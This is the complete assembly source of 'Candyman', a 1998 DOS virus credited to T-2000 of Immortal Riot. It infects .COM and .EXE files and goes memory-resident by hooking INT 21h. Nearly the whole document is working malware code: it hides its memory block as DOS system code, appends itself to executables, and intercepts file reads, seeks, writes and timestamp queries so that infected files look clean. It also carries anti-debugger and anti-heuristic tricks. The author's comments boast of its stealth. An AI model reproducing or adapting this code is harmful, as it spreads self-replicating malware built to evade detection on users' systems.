   ;============================================================================
   ;
   ;
   ;     NAME: Candyman v1.01
   ;     TYPE: Full-mirror .COM & .EXE-infector.
   ;     SIZE: 999 bytes.
   ;     DATE: October - November 1998.
   ;   AUTHOR: T-2000 / [Immortal Riot].
   ;   E-MAIL: T2000_@hotmail.com
   ;  PAYLOAD: Nope, it's completely harmless.
   ;      CPU: 286+
   ;
   ;
   ; After coding tons of conventional virii I felt like making something more
   ; original, quickly was decided for a mirror-type virus since there are only
   ; two more of these ever written (Mirror & Total Trash). The main difference
   ; between these two and my Candyman is the fact that Candyman works 100%
   ; independant, ie. it doesn't need any SFT's (Mirror), nor it doesn't have to
   ; maintain it's own filetables (Total Trash), this doesn't have to mean that
   ; Candyman is more viable in the wild, but in general it's more compatible
   ; with all the different DOS'es around.
   ;
   ;
   ; CAPABILITIES:
   ;
   ;       - Full-mirror (network compatible).
   ;       - Uses UMBs if available.
   ;
   ;
   ; NOD-Ice seems to be the only program which jams with Candyman resident, who
   ; cares, the bloody AV causes goddamn parity-errors all the time at my comp!
   ;
   ;
   ;      ... And don't fuck around with the mirror, coz he *WILL* come...
   ;
   ;============================================================================


                   .MODEL  TINY
                   .STACK  512
                   .286
                   .CODE


   Virus_Size      EQU     (Virus_End - Start)
   Virus_Size_Mem  EQU     ((Virus_End_Mem - Start) + 512 + 15) / 16
   Residency_Check EQU     0CA01h
   Marker_Mem      EQU     1998h
   Marker_File     EQU     9691h
   Min_Size_Infect EQU     560
   Lady_Di         EQU     0DEADh  ; She took her name a bit TOO seriously, heh.


   START:
                   CALL    Get_Delta               ; Get our position in memory.
   Anti_Debugger   DB      0EAh
   Get_Delta:      POP     SI
                   SUB     SI, (Anti_Debugger - Start)

                   PUSHA
                   PUSH    ES                      ; Save our PSP-segment.

                   MOV     AX, Residency_Check     ; Request residency-status.
                   INT     21h

                   CMP     AX, Marker_Mem          ; It's there? then abort
                   JE      Exec_Host               ; further TSR-installation.

                   MOV     AX, 5802h               ; Get UMB link-status.
                   INT     21h

                   CBW                             ; Save status at the stack.
                   PUSH    AX

                   MOV     AX, 5803h               ; Add UMBs to memory-chain.
                   PUSH    AX
                   MOV     BX, 01h
                   INT     21h

                   MOV     AX, 5800h               ; Get allocation-strategy.
                   INT     21h

                   PUSH    AX                      ; Save strategy on stack.

                   MOV     AX, 5801h               ; Set allocation strategy,
                   PUSH    AX                      ; first fit, start with UMBs.
                   MOV     BL, 80h
                   INT     21h

   Try_Alloc_Mem:  MOV     AH, 48h                 ; Try to allocate the needed
                   MOV     BX, Virus_Size_Mem      ; memory.
                   INT     21h
                   JNC     Copy_Virus_Up

                   MOV     AH, 4Ah                 ; Get size of current block.
                   MOV     BX, 0FFFFh
                   INT     21h

                   MOV     AH, 4Ah                 ; Resize block.
                   SUB     BX, Virus_Size_Mem + 1
                   INT     21h

                   JMP     Try_Alloc_Mem           ; Let's try again...

   Copy_Virus_Up:  MOV     ES, AX                  ; Our allocated block.

                   DEC     AX                      ; Get MCB of allocated block.
                   MOV     DS, AX

                   XOR     DI, DI

                   ; Disguise our block.

                   MOV     [DI.MCB_PSP], 08h       ; Owner is DOS.
                   MOV     [DI.MCB_Program], 'CS'  ; System-code.

                   POP     AX                      ; Restore allocation-
                   POP     BX                      ; strategy (AX=5801h).
                   INT     21h

                   POP     AX                      ; Restore UMB link-state,
                   POP     BX                      ; (AX=5803h).
                   INT     21h

                   PUSH    SI

                   MOV     CX, Virus_Size          ; Copy virus to allocated
                   CLD                             ; memory.
                   SEGCS
                   REP     MOVSB

                   POP     SI

                   PUSH    ES
                   POP     DS

                   MOV     AX, 3521h               ; Get address INT 21h.
                   INT     21h

                   MOV     Int21h, BX              ; Save address INT 21h.
                   MOV     Int21h+2, ES

                   MOV     AH, 25h                 ; Hook INT 21h.
                   MOV     DX, OFFSET NewInt21h
                   INT     21h

   Exec_Host:      POP     ES                      ; PSP of our host.
                   POPA

                   PUSH    CS
                   POP     DS

                   ADD     SI, OFFSET Host_Bytes

                   CMP     [SI.EXE_Mark], 'ZM'     ; Determine host-type.
                   JE      Exec_EXE

                   MOV     DI, 100h                ; Restore original bytes.
                   PUSH    DI
                   MOV     CX, (24 / 2)
                   CLD
                   REP     MOVSW

                   XOR     SI, SI
                   XOR     DI, DI

                   RETN                            ; Pass control to .COM-host.


   Exec_EXE:       MOV     DI, ES                  ; Get effective segment.
                   ADD     DI, 10h

                   ADD     [SI.Program_CS], DI     ; Add effective segment.

                   ADD     DI, [SI.Program_SS]     ; Get original SS.

                   PUSH    ES                      ; Restore DS.
                   POP     DS

                   CLI                             ; Restore .EXE-stack.
                   MOV     SS, DI
                   MOV     SP, CS:[SI.Program_SP]
                   STI

                   XOR     DI, DI

                   ; Pass control to .EXE-host.

                   JMP     DWORD PTR CS:[SI.Program_IP]


                   DB      'Speak my name 5 times in front of a mirror...'


   ; Returns CF set when handle in BX is not appropriate for infection.
   Check_Handle_Inf:

                   MOV     BP, SP                  ; Load BP with SP.

                   INC     BP                      ; Adjust value, (coz we
                   INC     BP                      ; CALLed this routine).

                   PUSH    DS

                   PUSH    CS
                   POP     DS

                   MOV     AX, 4201h               ; Get current file-position
                   XOR     CX, CX                  ; of handle in BX.
                   CWD
                   CALL    OldInt21h

                   MOV     File_Pos_Lo, AX         ; Save original fileposition.
                   MOV     File_Pos_Hi, DX

                   MOV     AX, 4400h               ; Get handle-info.
                   CALL    OldInt21h

                   OR      DL, DL                  ; Abort when it's not a file.
                   JS      JNE_Bad_Handle

                   CALL    Go_EOF                  ; Get filesize.

                   OR      DX, DX                  ; It's bigger than 64k ?
                   JNZ     Read_Header             ; Yeah? that's OK.

                   CMP     AX, Min_Size_Infect     ; It's big enough?
                   JB      JNE_Bad_Handle

   Read_Header:    CALL    Go_BOF

                   PUSH    CS
                   POP     ES

                   MOV     SI, OFFSET Header

                   MOV     AH, 3Fh                 ; Read header.
                   MOV     CL, 24
                   MOV     DX, SI
                   CALL    OldInt21h

                   PUSH    SI

                   MOV     DI, OFFSET Host_Bytes   ; Save original header.
                   CLD
                   REP     MOVSB

                   POP     SI

                   CMP     [SI.Checksum], Marker_File   ; Already infected?
                   JE      Bad_Handle

                   CMP     [SI.EXE_Mark], 'ZM'     ; It's an .EXE-file?
                   JE      Mirror_EXE

                   CMP     [SI.Jump], 0E9h         ; Most .COM-files start
   JNE_Bad_Handle: JNE     Bad_Handle              ; with a 16-bit JMP.

   Mirror_COM:     OR      DX, DX                  ; Can't be greater than 64k.
                   JNZ     Bad_Handle

                   ; .COM isn't too big?

                   CMP     AX, (65535 - (Virus_Size + 1024))
                   JA      Bad_Handle

                   SUB     AX, 3                   ; Calculate displacement.

                   MOV     [SI.Displacement], AX   ; Store displacement, the
                                                   ; JMP is already present.
                   JMP     Good_Handle

   Mirror_EXE:     MOV     AX, [SI.Header_Size_Mem]  ; Calculate headersize.
                   MOV     CL, 16
                   MUL     CX

                   PUSH    CX

                   XCHG    DI, AX

                   PUSH    DX

                   CALL    Go_EOF

                   POP     CX                      ; CX:DI = headersize.

                   SUB     AX, DI                  ; Calculate size of image.
                   SBB     DX, CX

                   POP     CX                      ; Calculate virus' new CS:IP.
                   DIV     CX                      ; (CX = 16).

                   MOV     [SI.Program_IP], DX     ; Set new CS:IP of host.
                   MOV     [SI.Program_CS], AX

                   INC     AX                      ; Anti-heuristic.

                   ; Set new SS:SP.

                   MOV     [SI.Program_SS], AX
                   MOV     [SI.Program_SP], (Virus_Size_Mem * 16) - 16

                   ADD     [SI.Min_Size_Mem], Virus_Size_Mem

                   CALL    Go_EOF

                   ADD     AX, Virus_Size          ; Calculate infected size.
                   ADC     DX, CX

                   MOV     CH, 512 SHR 8           ; Calculate 512-byte pages.
                   DIV     CX

                   OR      DX, DX                  ; Precise division?
                   JZ      No_Round

                   INC     AX                      ; Upround 512-byte pages.

   No_Round:       MOV     [SI.Image_512_Pages], AX
                   MOV     [SI.Image_Mod_512], DX

   Good_Handle:    MOV     [SI.Checksum], Marker_File  ; Mark file as infected.

                   CALL    Restore_File_Pos

                   POP     ES                      ; Caller's readbuffer.

                   XOR     CX, CX
                   MOV     DI, [BP.Reg_AX]

                   SUB     AX, DI                  ; Position before read.
                   SBB     DX, CX

                   CLC

                   RETN

   Bad_Handle:     CALL    Restore_File_Pos

                   POP     ES

                   STC

                   RETN


   ; Hmmm... a destructive payload would fit this topic better don't you think?

                   DB      'Candyman, Candyman, Candyman, Candyman, ...'


   Restore_File_Pos:

                   MOV     AX, 4200h
                   MOV     CX, 00h
   File_Pos_Hi     =       WORD PTR $-2
                   MOV     DX, 00h
   File_Pos_Lo     =       WORD PTR $-2
                   JMP     OldInt21h


   Go_BOF:
                   MOV     AX, 4200h
                   JMP     Set_Pos

   Go_EOF:         MOV     AX, 4202h
   Set_Pos:        XOR     CX, CX
                   CWD

   OldInt21h:      PUSHF
                   CALL    DWORD PTR CS:Int21h

                   RETN


   ; I'm used to save the _whole_ header of the host, simply becoz most of my
   ; virii are all full-stealth... this should save the pigs some work also.

   Host_Bytes      DW      'ZM'
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      (Virus_Size_Mem * 16)
                   DW      0
                   DW      OFFSET Carrier
                   DW      0


   Author          DB      'Written by T-2000 / Immortal Riot'


   NewInt21h:

   ; ============= FIND FIRST/NEXT FCB =========================================

                   CMP     AH, 11h                 ; Findfirst (FCB) ?
                   JB      Check_4_Find_H

                   CMP     AH, 12h                 ; Findnext (FCB) ?
                   JA      Check_4_Find_H

   Mirror_FCB:     CALL    OldInt21h

                   PUSHF                           ; Save all registers.
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   OR      AL, AL                  ; Successful operation?
                   JNZ     JNE_Exit_Mir_S

                   MOV     AH, 2Fh                 ; Get DTA-address.
                   CALL    OldInt21h

                   CMP     ES:[BX.FCB_Drive], -1   ; It's an extended FCB ?
                   JNE     No_Ext_FCB

                   ADD     BX, 7                   ; Then skip extended block.

   No_Ext_FCB:     LEA     SI, [BX.FCB_Size]       ; Set index-registers.
                   LEA     DI, [BX.FCB_Name+8]
                   LEA     BX, [BX.FCB_Time]

                   JMP     Edit_DTA


   ; ============= FIND FIRST/NEXT HANDLE ======================================

   Check_4_Find_H: CMP     AH, 4Eh                 ; Findfirst (handle) ?
                   JB      Check_4_Read

                   CMP     AH, 4Fh                 ; Findnext (handle) ?
                   JA      Check_4_Read

   Mirror_Handle:  CALL    OldInt21h

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      Exit_Mir_Size

                   MOV     AX, 2F00h + '.'         ; Get DTA-address.
                   CALL    OldInt21h

                   LEA     DI, [BX.Handle_Name]    ; Find extension-offset.
                   MOV     CH, 0FFh
                   CLD
                   REPNE   SCASB

                   LEA     SI, [BX.Handle_Size]    ; Set index-registers.
                   LEA     BX, [BX.Handle_Time]

   Edit_DTA:       PUSH    ES
                   POP     DS

                   CWD                             ; DX = 00h.

                   MOV     AL, DS:[BX]             ; Get filetime.

                   AND     AL, 00011111b           ; Mask seconds.

                   CMP     AL, (60 / 2)            ; 60 seconds?
                   JE      Exit_Mir_Size           ; If so, abort mirror.

                   CMP     DS:[SI+2], DX           ; File is over 64k ?
                   JNZ     Check_COM_Ext

                   CMP     DS:[SI], Min_Size_Infect ; Large enough?
                   JB      Exit_Mir_Size

   Check_COM_Ext:  CMP     DS:[DI], 'OC'           ; .COM-extension?
                   JNE     Check_EXE_Ext

                   CMP     BYTE PTR DS:[DI+2], 'M'
   JNE_Exit_Mir_S: JNE     Exit_Mir_Size

                   CMP     [SI+2], DX              ; .COM is bigger than 64k ?
                   JNZ     Exit_Mir_Size

                   ; .COM is not too big?

                   CMP     [SI], (65535 - (Virus_Size + 1024))
                   JB      Add_Size_Virus

   Check_EXE_Ext:  CMP     DS:[DI], 'XE'           ; .EXE-entension?
                   JNE     Exit_Mir_Size

                   CMP     BYTE PTR DS:[DI+2], 'E'
                   JNE     Exit_Mir_Size

   Add_Size_Virus: ADD     DS:[SI], Virus_Size     ; Add virussize.
                   ADC     DS:[SI+2], DX

                   ; Set infected timestamp.

                   AND     BYTE PTR DS:[BX], 11100000b
                   OR      BYTE PTR DS:[BX], (60 / 2)

   Exit_Mir_Size:  JMP     Exit_Mirror_S


   ; ============= FILE READ ===================================================

   Check_4_Read:   CMP     AH, 3Fh                 ; Read handle.
                   JNE     Check_4_Seek

   Mirror_Read:    CALL    OldInt21h               ; Execute read.

                   PUSHF                           ; Save all registers.
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      Exit_Mirror_R           ; Abort if error occurred.

                   CALL    Check_Handle_Inf
                   JC      Exit_Mirror_R

                   PUSH    AX
                   PUSH    DX

                   JNZ     Read_Over_64k           ; Read started in 1st 64k ?

                   CMP     AX, 24                  ; They are reading from the
                   JNB     Read_Over_64k           ; header?

                   ; === Mirror the read header. ===

                   ADD     DI, AX                  ; Calculate end of read.
                   JC      Adjust_DI               ; Overflow?

                   CMP     DI, 24                  ; They read to the end of
                   JB      No_Adjust_DI            ; the header?

   Adjust_DI:      MOV     DI, 24                  ; If so, adjust register.

   No_Adjust_DI:   MOV     CX, DI                  ; Howmany bytes to mirror?
                   SUB     CX, AX

                   MOV     DI, [BP.Reg_DX]
                   ADD     SI, AX
                   CLD                             ; Copy infected header into
                   REP     MOVSB                   ; caller's buffer.

   Read_Over_64k:  POP     DI                      ; DI:SI position before read.
                   POP     SI

                   ADD     SI, [BP.Reg_CX]         ; DI:SI = position after
                   ADC     DI, CX                  ; read.

                   CALL    Go_EOF

           ; === Check if the read ends above the clean host. ===

                   CMP     DI, DX                  ; Check high word.
                   JB      Restore_Read
                   JA      Mirror_Above

                   CMP     SI, AX                  ; Check low word.
                   JNA     Restore_Read

   Mirror_Above:   ADD     AX, Virus_Size          ; Calculate size of
                   ADC     DX, CX                  ; mirrored host.

                   ; Check if the read ends before the end
                   ; of the virtual virusbody has reached.

                   CMP     DI, CX                  ; Check high word.
                   JB      No_Adjust
                   JA      Do_Adjust

                   CMP     SI, AX                  ; Check low word.
                   JNA     No_Adjust

   Do_Adjust:      MOV     SI, AX                  ; Read was over virusbody.
                   MOV     DI, DX

   No_Adjust:      SUB     AX, Virus_Size

                   PUSH    AX

                   CALL    Restore_File_Pos        ; Restore position after
                                                   ; the caller's read.
                   POP     CX

                   MOV     File_Pos_Lo, SI         ; Save new file-position.
                   MOV     File_Pos_Hi, DI

                   SUB     SI, AX

                   SUB     AX, CX

                   MOV     CX, SI
                   XCHG    SI, AX

                   MOV     DI, [BP.Reg_DX]
                   ADD     DI, [BP.Reg_AX]
                   ADD     [BP.Reg_AX], CX
                   CLD                             ; Copy virusbody into
                   REP     MOVSB                   ; caller's readbuffer.

   Restore_Read:   CALL    Restore_File_Pos

   Exit_Mirror_R:  JMP     Exit_Mirror_S


   ; ============= FILE SEEK ===================================================

   Check_4_Seek:   CMP     AX, 4202h               ; Seek EOF ?
                   JNE     Check_4_Write

   Mirror_Seek:    CALL    OldInt21h

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      Exit_Mirror_S

                   CALL    Check_Handle_Inf        ; Handle appropriate for
                   JC      Exit_Mirror_S           ; infection?

                   MOV     AX, 4201h               ; Add the virussize to EOF.
                   MOV     DX, Virus_Size
                   CALL    OldInt21h

                   MOV     [BP.Reg_AX], AX         ; Set new values in stack.
                   MOV     [BP.Reg_DX], DX

   Exit_Mirror_S:  POP     ES
                   POP     DS

                   JMP     Exit_RETF2


   ; ============= FILE WRITE ==================================================

   Check_4_Write:  CMP     AH, 40h                 ; Write file?
                   JNE     Check_4_TDate

                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   CALL    Check_Handle_Inf
                   JC      Abort_Routine

                   CALL    Go_BOF

                   MOV     AH, 40h                 ; Write the infected header.
                   MOV     CL, 24
                   MOV     DX, SI
                   CALL    OldInt21h
                   JC      Restore_Pos

                   CALL    Go_EOF

                   MOV     AH, 40h                 ; Write the virusbody.
                   MOV     CX, Virus_Size
                   CWD
                   CALL    OldInt21h

   Restore_Pos:    CALL    Restore_File_Pos

   Exit_Mir_Write: POP     ES
                   POP     DS
                   POPA

                   CALL    OldInt21h               ; Do the write.
                   JC      Do_RETF2

                   PUSHF
                   PUSHA

                   MOV     AX, 5700h               ; Get filedate & time.
                   CALL    OldInt21h

                   MOV     AX, 5701h               ; Set infected timestamp.
                   AND     CL, 11100000b
                   OR      CL, (60 / 2)
                   CALL    OldInt21h

   Exit_RETF2:     POPA
                   POPF

   Do_RETF2:       RETF    2


   ; ============= GET FILE DATE & TIME ========================================

   Check_4_TDate:  CMP     AX, 5700h               ; Get filedate & time?
                   JNE     Check_4_Res

   Mirror_F_Time:  CALL    OldInt21h

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      Exit_Filetime

                   CALL    Check_Handle_Inf        ; Handle OK for infection?
                   JC      Exit_Filetime

                   ; Set infected timestamp in the stack.

                   AND     BYTE PTR [BP.Reg_CX], 11100000b
                   OR      BYTE PTR [BP.Reg_CX], (60 / 2)

   Exit_Filetime:  JMP     Exit_Mirror_S


   ; ============= VIRUS RESIDENCY CHECK =======================================

   Check_4_Res:    CMP     AX, Residency_Check     ; "Are-you-there-bro?" call?
                   JNE     JMP_Int21h

                   MOV     AX, Marker_Mem          ; Yeah dude, here I am.

                   IRET

   Abort_Routine:  POP     ES
                   POP     DS
                   POPA

   JMP_Int21h:     DB      0EAh                    ; JMP FAR opcode.

   Virus_End:

   Int21h          DW      0, 0

   Header          DB      24 DUP(0)

   Virus_End_Mem:



   COM_Header      STRUC
   Jump            DB      0
   Displacement    DW      0
   COM_Header      ENDS


   EXE_Header      STRUC
   EXE_Mark        DW      0       ; Marker valid .EXE-file: MZ or ZM.
   Image_Mod_512   DW      0
   Image_512_Pages DW      0
   Reloc_Items     DW      0
   Header_Size_Mem DW      0
   Min_Size_Mem    DW      0
   Max_Size_Mem    DW      0
   Program_SS      DW      0
   Program_SP      DW      0
   Checksum        DW      0
   Program_IP      DW      0
   Program_CS      DW      0
   Offs_RelocTable DW      0
   Overlay_Number  DW      0
   Undocumented    DW      0
   Unused          DW      0
   EXE_Header      ENDS


   FindFirstHandle STRUC
   Handle_Reserved DB      21 DUP(0)
   Handle_Attr     DB      0
   Handle_Time     DW      0
   Handle_Date     DW      0
   Handle_Size     DW      0, 0
   Handle_Name     DW      6 DUP(0)
                   DB      0
   FindFirstHandle ENDS


   FindFirst_FCB   STRUC
   FCB_Drive       DB      0
   FCB_Name        DB      8 DUP(0)
   FCB_Ext         DB      3 DUP(0)
   FCB_Attr        DB      0
   FCB_Reserved    DB      10 DUP(0)
   FCB_Time        DW      0
   FCB_Date        DW      0
   FCB_Start_Clust DW      0
   FCB_Size        DW      0, 0
   FindFirst_FCB   ENDS


   Push_All_Stack  STRUC
   Reg_ES          DW      0
   Reg_DS          DW      0
   Reg_DI          DW      0
   Reg_SI          DW      0
   Reg_BP          DW      0
   Reg_SP          DW      0
   Reg_BX          DW      0
   Reg_DX          DW      0
   Reg_CX          DW      0
   Reg_AX          DW      0
   Reg_Flags       DW      0
   Reg_Ret_Addr    DW      0
   Push_All_Stack  ENDS


   MCB_Header      STRUC
   MCB_Type        DB      0               ; M = not last block, Z = last block.
   MCB_PSP         DW      0               ; PSP-segment of this block.
   MCB_Size_Mem    DW      0               ; Size of block in paragraphs.
   MCB_Dunno       DB      3 DUP(0)        ; Don't care, don't need it.
   MCB_Program     DW      4 DUP(0)        ; Filename of program of this block.
   MCB_Header      ENDS


   Carrier:
                   PUSH    CS
                   POP     DS

                   MOV     AH, 09h
                   MOV     DX, OFFSET Carrier_Msg
                   INT     21h

                   MOV     AX, 4C00h
                   INT     21h

   Carrier_Msg     DB      'File infected with Candyman virus!', 0Ah, 0Dh, '$'

                   END     START
